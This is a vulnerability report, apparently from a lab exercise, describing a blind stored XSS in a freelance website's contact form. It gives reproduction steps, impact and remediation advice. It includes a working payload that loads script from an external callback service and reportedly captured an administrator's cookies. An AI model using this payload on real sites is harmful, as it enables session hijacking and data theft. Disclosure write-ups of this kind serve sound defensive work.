## Title
Blind XSS - Freelance Full-Stack Developer

## Description
A Blind Cross-Site Scripting (XSS) vulnerability was identified in the project inquiry form of the freelance website. The application accepts user-controlled input through the Full Name and Message fields without safely handling HTML and JavaScript content.

An attacker can submit a crafted payload that is stored by the application and executes when an administrator views the submitted inquiry. The execution is blind because the attacker does not directly see the JavaScript execution in the original browser; instead, an external XSS reporting service receives the callback.

**Affected URL:** https://freelance.pwnedbox.site/index.php#contact

## Steps to Reproduce
1. Open the affected website and navigate to the Contact section.
2. Enter the XSS payload in the Full Name and Message fields.
3. Submit the project inquiry form.
4. Wait for an administrator to view the submitted inquiry.
5. Check the XSS.Report dashboard for the resulting callback.

## POC (Proof of Concept)
**Lab Address:** https://freelance.pwnedbox.site/

**HTTP Method:** POST

**Vulnerable Parameters:** Full Name and Message

**Payload:**
```html
"><script src=https://xss.report/c/mihir></script>
```

**Observed Result:**

The submitted payload was stored by the application. When the relevant inquiry was viewed, the external XSS reporting service recorded callbacks.

The XSS.Report dashboard showed:
- Multiple callback entries associated with the vulnerable admin inquiry page.
- Cookie indicator: successful.
- Session Storage indicator: unsuccessful.
- Local Storage indicator: unsuccessful.

This confirms that the injected JavaScript executed in the context of the page viewed by the administrator.

**Screenshot Evidence:**
1. Contact form showing the injected payload in the Full Name and Message fields.
<img width="1913" height="973" alt="image" src="https://github.com/user-attachments/assets/a857d840-5812-40cd-ba61-92a660fa173b" />

2. XSS.Report activity dashboard showing callbacks from the vulnerable admin inquiry page.
<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/74dde5c1-1354-4801-9cc8-f39303f0c93d" />

3. XSS.Report callback indicators showing cookie access availability.
<img width="1918" height="977" alt="image" src="https://github.com/user-attachments/assets/1f3303b6-fcfb-4fd2-8985-868e52ecef29" />


## Impact
An attacker could exploit this vulnerability to execute JavaScript in an administrator's browser when the stored inquiry is viewed.

Potential consequences include:
- Exposure of accessible information in the administrator's browser context.
- Theft of sensitive data accessible to injected JavaScript, including cookies that are not protected by HttpOnly.
- Unauthorized actions performed within the administrator's authenticated session, depending on application protections.
- Manipulation of the administrator-facing page or presentation of malicious content.

## Remediation
1. Apply context-aware output encoding to all user-controlled data before displaying it in HTML.
2. Sanitize user input using a trusted HTML sanitization library where HTML input is required.
3. Avoid inserting untrusted data directly into HTML or executable JavaScript contexts.
4. Implement a restrictive Content Security Policy (CSP) to limit script execution and untrusted external script sources.
5. Ensure session cookies use the HttpOnly, Secure, and SameSite attributes where appropriate.
